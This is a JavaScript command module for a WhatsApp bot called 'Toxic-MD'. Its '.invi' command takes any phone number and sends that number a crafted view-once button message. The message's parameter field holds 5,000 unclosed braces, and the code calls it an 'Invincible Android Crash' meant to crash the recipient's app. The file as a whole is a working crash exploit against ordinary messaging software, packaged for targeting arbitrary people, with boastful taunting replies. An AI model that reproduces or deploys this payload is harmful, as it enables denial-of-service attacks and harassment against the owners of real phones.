import config from "../config.cjs";

const invi = async (m, Matrix) => {
  try {
    const prefix = config.Prefix || config.PREFIX || ".";
    const botNumber = await Matrix.decodeJid(Matrix.user.id);
    const isCreator = [botNumber, config.OWNER_NUMBER + "@s.whatsapp.net"].includes(m.sender);
    const cmd = m.body?.startsWith(prefix) ? m.body.slice(prefix.length).split(" ")[0].toLowerCase() : "";
    const args = m.body.slice(prefix.length + cmd.length).trim();

    if (cmd === "invi") {
      if (!isCreator) {
        return Matrix.sendMessage(m.from, {
          text: `◈━━━━━━━━━━━━━━━━◈
│❒ Step off, loser! Only *Toxic-MD*’s boss can unleash the *Invincible Android Crash*! 😤🔪
◈━━━━━━━━━━━━━━━━◈`,
        }, { quoted: m });
      }

      if (!args) {
        return Matrix.sendMessage(m.from, {
          text: `◈━━━━━━━━━━━━━━━━◈
│❒ Yo, give me a phone number to hit with the *Invincible Android Crash*! 😈
│❒ Example: .invi 2547********
◈━━━━━━━━━━━━━━━━◈`,
        }, { quoted: m });
      }

      const target = args.replace(/\D/g, ""); // Clean non-digits
      if (!/^\d{10,15}$/.test(target)) {
        return Matrix.sendMessage(m.from, {
          text: `◈━━━━━━━━━━━━━━━━◈
│❒ Invalid number, fam! Use a valid phone number (10-15 digits). 😣
◈━━━━━━━━━━━━━━━━◈`,
        }, { quoted: m });
      }

      const targetJid = `${target}@s.whatsapp.net`; // Format as WhatsApp JID

      await Matrix.sendMessage(m.from, {
        text: `◈━━━━━━━━━━━━━━━━◈
│❒ *Toxic-MD* droppin' the *Invincible Android Crash* on ${target}! 💥
◈━━━━━━━━━━━━━━━━◈`,
      }, { quoted: m });

      // Send the crash message
      await invisAndroid(targetJid, Matrix);

      await Matrix.sendMessage(m.from, {
        text: `◈━━━━━━━━━━━━━━━━◈
│❒ Crash payload sent to ${target}! They ain't ready for this! 😎
◈━━━━━━━━━━━━━━━━◈`,
      }, { quoted: m });
    }
  } catch (error) {
    console.error(`❌ Invi error: ${error.message}`);
    await Matrix.sendMessage(m.from, {
      text: `◈━━━━━━━━━━━━━━━━◈
│❒ *Toxic-MD* hit a snag, fam! Something broke, try again! 😡
◈━━━━━━━━━━━━━━━━◈`,
    }, { quoted: m });
  }
};

async function invisAndroid(target, Matrix) {
  await Matrix.relayMessage(target, {
    viewOnceMessage: {
      message: {
        buttonsMessage: {
          text: "hi",
          contentText: "null",
          buttons: [
            {
              buttonId: "8178018",
              buttonText: {
                displayText: "Good morning",
              },
              type: "NATIVE_FLOW",
              nativeFlowInfo: {
                name: "cta_url",
                paramsJson: `{`.repeat(5000), // Large ayload 🗿
              },
            },
          ],
          headerType: "TEXT",
        },
      },
    },
  }, {});
}

export default invi;